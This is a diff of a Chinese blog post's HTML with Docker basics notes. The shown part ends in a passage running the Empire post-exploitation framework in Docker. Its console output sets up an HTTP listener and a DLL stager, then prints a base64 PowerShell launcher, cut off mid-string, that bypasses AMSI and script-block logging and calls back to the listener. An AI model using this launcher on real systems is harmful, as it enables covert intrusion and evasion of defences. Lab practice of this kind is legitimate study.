@@ -1,103 +1,31 @@
-<!doctype html>
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
+<!DOCTYPE html>
+<html>
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
 
+    
 
+    <title>
+      Docker笔记—基础篇 | Z3R0YU 
+    </title>
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-  
-  
-  
-  
-
-  
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="z3r0yu">
     
     
-  
 
-  
-
-  
-
-  
-
-  
-
-  
-    
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="ZEROYU, SEC" />
-
-
-
-
-  
-
-
-  <link rel="alternate" href="/atom.xml" title="ZEROYU" type="application/atom+xml" />
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
-
-
-
-
-
-
-<meta name="description" content="概念Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。
+    <meta name="description" content="概念Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。
 Docker容器：一个轻量级沙箱，来运行和隔离应用
 Docker仓库：用来存储Docker镜像文件的地方
 Docker中用于区分的方式是id或者name:tag
 安装官方文档：https://docs.docker.com/
 操作镜像####1.获取镜像（默认是从docker hub网站进行镜像的获取）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Docker笔记—基础篇">
+<meta property="og:title" content="Docker笔记—基础篇 | Z3R0YU">
 <meta property="og:url" content="http://zer0yu.github.io/2017/12/02/Docker笔记—基础篇/index.html">
-<meta property="og:site_name" content="ZEROYU">
+<meta property="og:site_name" content="Z3R0YU">
 <meta property="og:description" content="概念Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。
 Docker容器：一个轻量级沙箱，来运行和隔离应用
 Docker仓库：用来存储Docker镜像文件的地方
@@ -106,309 +34,193 @@ Docker中用于区分的方式是id或者name:tag
 操作镜像####1.获取镜像（默认是从docker hub网站进行镜像的获取）">
 <meta property="og:updated_time" content="2017-12-04T13:16:56.040Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Docker笔记—基础篇">
+<meta name="twitter:title" content="Docker笔记—基础篇 | Z3R0YU">
 <meta name="twitter:description" content="概念Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。
 Docker容器：一个轻量级沙箱，来运行和隔离应用
 Docker仓库：用来存储Docker镜像文件的地方
 Docker中用于区分的方式是id或者name:tag
 安装官方文档：https://docs.docker.com/
 操作镜像####1.获取镜像（默认是从docker hub网站进行镜像的获取）">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
 
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    sidebar: {"position":"left","display":"post"},
-    fancybox: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://zer0yu.github.io/2017/12/02/Docker笔记—基础篇/"/>
-
-
-
-
-
-  <title> Docker笔记—基础篇 | ZEROYU </title>
 </head>
+<body>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
 
-  
-
-
-
-  <script type="text/javascript">
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?414e74bab07e7101a26a8ca95416288a";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
-
-
-
-
-
-
-
-
-  
-  
     
-  
 
-  <div class="container one-collumn sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
+<header class="panel-cover panel-cover--collapsed">
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-meta ">
-  
 
-  <div class="custom-logo-site-title">
-    <a href="/"  class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <span class="site-title">ZEROYU</span>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-    
-      <p class="site-subtitle"></p>
-    
-</div>
-
-<div class="site-nav-toggle">
-  <button>
-    <span class="btn-bar"></span>
-    <span class="btn-bar"></span>
-    <span class="btn-bar"></span>
-  </button>
-</div>
-
-<nav class="site-nav">
-  
+  <div class="panel-main">
 
   
-    <ul id="menu" class="menu">
-      
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
-            
-            关于
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
 
-      
-        <li class="menu-item menu-item-search">
-          
-            <a href="javascript:;" class="popup-trigger">
-          
-            
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
-            
-            搜索
-          </a>
-        </li>
-      
-    </ul>
-  
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Z3R0YU</a></h1>
+        <hr class="panel-cover__divider" />
 
-  
-    <div class="site-search">
-      
-  <div class="popup">
- <span class="search-icon fa fa-search"></span>
- <input type="text" id="local-search-input">
- <div id="local-search-result"></div>
- <span class="popup-btn-close">close</span>
-</div>
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archives" title="" class="">归档</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
 
 
-    </div>
-  
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zer0yu" title="z3r0yu on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+
+    <!-- China social icon -->
+    <!--
+
+      <li class="navigation__item">
+        <a href="" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">Douban</span>
+        </a>
+      </li>
+    -->
+
+      <li class="navigation__item">
+        <a href="https://weibo.com/Z3r0yu" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+
+
+
+
+  </ul>
 </nav>
 
 
 
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/12/02/Docker笔记—基础篇/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                Docker笔记—基础篇
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-02T10:33:38+08:00">
-                2017-12-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/12/02/Docker笔记—基础篇/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/12/02/Docker笔记—基础篇/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/12/02/Docker笔记—基础篇/" class="leancloud_visitors" data-flag-title="Docker笔记—基础篇">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
         </div>
-      </header>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">Docker笔记—基础篇</h1>
+
     
 
+    <div class="post-meta">
+      <time datetime="2017-12-02" class="post-meta__date date">2017-12-02</time> 
 
-    <div class="post-body" itemprop="articleBody">
+      <span class="post-meta__tags tags">
 
-      
-      
+          
 
-      
-        <h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。</p>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Docker镜像：一个只读模板，是创建Docker容器的基础。镜像文件是由多个层组成的。</p>
 <p>Docker容器：一个轻量级沙箱，来运行和隔离应用</p>
 <p>Docker仓库：用来存储Docker镜像文件的地方</p>
 <p>Docker中用于区分的方式是id或者name:tag</p>
@@ -461,618 +273,63 @@ Docker中用于区分的方式是id或者name:tag
 <p>在vps中的docker上使用empire进行渗透测试(metasploit同理)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#端口映射参考上条</span></div><div class="line">================================================================</div><div class="line"> [Empire]  Post-Exploitation Framework</div><div class="line">================================================================</div><div class="line"> [Version] 2.3 | [Web] https://github.com/empireProject/Empire</div><div class="line">================================================================</div><div class="line"></div><div class="line">   _______ .___  ___. .______    __  .______       _______</div><div class="line">  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|</div><div class="line">  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__</div><div class="line">  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|</div><div class="line">  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____</div><div class="line">  |_______||__|  |__| | _|      |__| | _| `._____||_______|</div><div class="line"></div><div class="line"></div><div class="line">       282 modules currently loaded</div><div class="line"></div><div class="line">       0 listeners currently active</div><div class="line"></div><div class="line">       0 agents currently active</div><div class="line"></div><div class="line"></div><div class="line">(Empire) &gt; <span class="built_in">help</span></div><div class="line"></div><div class="line">Commands</div><div class="line">========</div><div class="line">agents            Jump to the Agents menu.</div><div class="line">creds             Add/display credentials to/from the database.</div><div class="line"><span class="built_in">exit</span>              Exit Empire</div><div class="line"><span class="built_in">help</span>              Displays the <span class="built_in">help</span> menu.</div><div class="line">interact          Interact with a particular agent.</div><div class="line">list              Lists active agents or listeners.</div><div class="line">listeners         Interact with active listeners.</div><div class="line">load              Loads Empire modules from a non-standard folder.</div><div class="line">preobfuscate      Preobfuscate PowerShell module_source files</div><div class="line">reload            Reload one (or all) Empire modules.</div><div class="line">reset             Reset a global option (e.g. IP whitelists).</div><div class="line">resource          Read and execute a list of Empire commands from a file.</div><div class="line">searchmodule      Search Empire module names/descriptions.</div><div class="line"><span class="built_in">set</span>               Set a global option (e.g. IP whitelists).</div><div class="line">show              Show a global option (e.g. IP whitelists).</div><div class="line">usemodule         Use an Empire module.</div><div class="line">usestager         Use an Empire stager.</div><div class="line"></div><div class="line">(Empire) &gt; list</div><div class="line">(Empire) &gt; listeners</div><div class="line">[!] No listeners currently active</div><div class="line">(Empire: listeners) &gt; uselistener http</div><div class="line">(Empire: listeners/http) &gt; info</div><div class="line"></div><div class="line">    Name: HTTP[S]</div><div class="line">Category: client_server</div><div class="line"></div><div class="line">Authors:</div><div class="line">  @harmj0y</div><div class="line"></div><div class="line">Description:</div><div class="line">  Starts a http[s] listener (PowerShell or Python) that uses a</div><div class="line">  GET/POST approach.</div><div class="line"></div><div class="line">HTTP[S] Options:</div><div class="line"></div><div class="line">  Name              Required    Value                            Description</div><div class="line">  ----              --------    -------                          -----------</div><div class="line">  SlackToken        False                                        Your SlackBot API token to communicate with your Slack instance.</div><div class="line">  ProxyCreds        False       default                          Proxy credentials ([domain\]username:password) to use <span class="keyword">for</span> request (default, none, or other).</div><div class="line">  KillDate          False                                        Date <span class="keyword">for</span> the listener to <span class="built_in">exit</span> (MM/dd/yyyy).</div><div class="line">  Name              True        http                             Name <span class="keyword">for</span> the listener.</div><div class="line">  Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.</div><div class="line">  DefaultDelay      True        5                                Agent delay/reach back interval (<span class="keyword">in</span> seconds).</div><div class="line">  DefaultLostLimit  True        60                               Number of missed checkins before exiting</div><div class="line">  WorkingHours      False                                        Hours <span class="keyword">for</span> the agent to operate (09:00-17:00).</div><div class="line">  SlackChannel      False       <span class="comment">#general                         The Slack channel or DM that notifications will be sent to.</span></div><div class="line">  DefaultProfile    True        /admin/get.php,/news.php,/login/ Default communication profile <span class="keyword">for</span> the agent.</div><div class="line">                                process.php|Mozilla/5.0 (Windows</div><div class="line">                                NT 6.1; WOW64; Trident/7.0;</div><div class="line">                                rv:11.0) like Gecko</div><div class="line">  Host              True        http://172.17.0.2:80             Hostname/IP <span class="keyword">for</span> staging.</div><div class="line">  CertPath          False                                        Certificate path <span class="keyword">for</span> https listeners.</div><div class="line">  DefaultJitter     True        0.0                              Jitter <span class="keyword">in</span> agent reachback interval (0.0-1.0).</div><div class="line">  Proxy             False       default                          Proxy to use <span class="keyword">for</span> request (default, none, or other).</div><div class="line">  UserAgent         False       default                          User-agent string to use <span class="keyword">for</span> the staging request (default, none, or other).</div><div class="line">  StagingKey        True        3ab47284cf7e260541d810beb54d3405 Staging key <span class="keyword">for</span> initial agent negotiation.</div><div class="line">  BindIP            True        0.0.0.0                          The IP to <span class="built_in">bind</span> to on the control server.</div><div class="line">  Port              True        80                               Port <span class="keyword">for</span> the listener.</div><div class="line">  ServerVersion     True        Microsoft-IIS/7.5                Server header <span class="keyword">for</span> the control server.</div><div class="line">  StagerURI         False                                        URI <span class="keyword">for</span> the stager. Must use /download/. Example: /download/stager.php</div><div class="line"></div><div class="line"></div><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Name docker</div><div class="line"><span class="comment">#此处的172.16.188.1为vps的ip地址</span></div><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Host http://172.16.188.1:5000</div><div class="line">(Empire: listeners/http) &gt; execute</div><div class="line">[*] Starting listener <span class="string">'docker'</span></div><div class="line">[+] Listener successfully started!</div><div class="line">(Empire: listeners/http) &gt; lsit</div><div class="line">*** Unknown syntax: lsit</div><div class="line">(Empire: listeners/http) &gt; back</div><div class="line">(Empire: listeners) &gt; list</div><div class="line"></div><div class="line">[*] Active listeners:</div><div class="line"></div><div class="line">  Name              Module          Host                                 Delay/Jitter   KillDate</div><div class="line">  ----              ------          ----                                 ------------   --------</div><div class="line">  docker            http            http://172.16.188.1:5000             5/0.0</div><div class="line"></div><div class="line">(Empire: listeners) &gt; usestager</div><div class="line">multi/bash                osx/dylib                 osx/teensy                windows/launcher_sct</div><div class="line">multi/launcher            osx/jar                   windows/bunny             windows/launcher_vbs</div><div class="line">multi/pyinstaller         osx/launcher              windows/dll               windows/macro</div><div class="line">multi/war                 osx/macho                 windows/ducky             windows/macroless_msword</div><div class="line">osx/applescript           osx/macro                 windows/hta               windows/teensy</div><div class="line">osx/application           osx/pkg                   windows/launcher_bat</div><div class="line">osx/ducky                 osx/safari_launcher       windows/launcher_lnk</div><div class="line">(Empire: listeners) &gt; usestager windows/d</div><div class="line">dll    ducky</div><div class="line">(Empire: listeners) &gt; usestager windows/dll</div><div class="line">(Empire: stager/windows/dll) &gt; info</div><div class="line"></div><div class="line">Name: DLL Launcher</div><div class="line"></div><div class="line">Description:</div><div class="line">  Generate a PowerPick Reflective DLL to inject with</div><div class="line">  stager code.</div><div class="line"></div><div class="line">Options:</div><div class="line"></div><div class="line">  Name             Required    Value             Description</div><div class="line">  ----             --------    -------           -----------</div><div class="line">  Listener         True                          Listener to use.</div><div class="line">  ProxyCreds       False       default           Proxy credentials</div><div class="line">                                                 ([domain\]username:password) to use <span class="keyword">for</span></div><div class="line">                                                 request (default, none, or other).</div><div class="line">  Obfuscate        False       False             Switch. Obfuscate the launcher</div><div class="line">                                                 powershell code, uses the</div><div class="line">                                                 ObfuscateCommand <span class="keyword">for</span> obfuscation types.</div><div class="line">                                                 For powershell only.</div><div class="line">  Proxy            False       default           Proxy to use <span class="keyword">for</span> request (default, none,</div><div class="line">                                                 or other).</div><div class="line">  Language         True        powershell        Language of the stager to generate.</div><div class="line">  OutFile          True        /tmp/launcher.dll File to output dll to.</div><div class="line">  UserAgent        False       default           User-agent string to use <span class="keyword">for</span> the staging</div><div class="line">                                                 request (default, none, or other).</div><div class="line">  Arch             True        x64               Architecture of the .dll to generate</div><div class="line">                                                 (x64 or x86).</div><div class="line">  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation <span class="built_in">command</span> to use.</div><div class="line">                                                 Only used <span class="keyword">if</span> Obfuscate switch is True.</div><div class="line">                                                 For powershell only.</div><div class="line">  StagerRetries    False       0                 Times <span class="keyword">for</span> the stager to retry</div><div class="line">                                                 connecting.</div><div class="line"></div><div class="line"></div><div class="line">(Empire: stager/windows/dll) &gt; <span class="built_in">set</span> Listener docker</div><div class="line">(Empire: stager/windows/dll) &gt; back</div><div class="line">(Empire: listeners) &gt; launcher powershell docker</div><div class="line">powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAcwBpAE8A<span class="built_in">bg</span>BUAEEAYgBMAEUALgBQAFMAVgBFAHIAcwBJAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBFAGYAXQAuAEEAcwBzAEUATQBCAGwAWQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAGwAdQBlACgAJABOAFUAbABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkA<span class="built_in">bg</span>BnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkA<span class="built_in">bg</span>BnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkA<span class="built_in">bg</span>B2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBDAHIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcARQBUAEYASQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbAB1AEUAKAAkAG4AVQBsAGwALAAoAE4AZQBXAC0ATwBCAGoAZQBDAFQAIABDAG8ATABsAEUAYwBUAGkAbwBOAHMALgBHAEUATgBlAFIAaQBDAC4ASABBAHMASABTAEUAVABbAFMAdAByAEkA<span class="built_in">bg</span>BHAF0AKQApAH0AWwBSAEUAZgBdAC4AQQBzAFMARQBtAEIATAB5AC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEA<span class="built_in">bg</span>BhAGcAZQBtAGUA<span class="built_in">bg</span>B0AC4AQQB1AHQAbwBtAGEAdABpAG8A<span class="built_in">bg</span>AuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8A<span class="built_in">bg</span>BQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQA<span class="built_in">bg</span>B1AGwAbAAsACQAVABSAHUAZQApAH0AOwB9ADsAWwBTAFkAcwB0AEUAbQAuAE4ARQB0AC4AUwBFAFIAdgBpAEMAZQBQAG8ASQBOAFQATQBBAG4AYQBnAEUAcgBdADoAOgBFAFgAcABlAEMAVAAxADAAMABDAE8A<span class="built_in">bg</span>B0AGkA<span class="built_in">bg</span>BVAEUAPQAwADsAJAB3AEMAPQBOAGUAVwAtAE8AQgBqAGUAQwB0ACAAUwB5AFMAVABlAE0ALgBOAGUAVAAuAFcARQBiAEMATABJAEUA<span class="built_in">bg</span>BUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUA<span class="built_in">bg</span>B0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABFAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUA<span 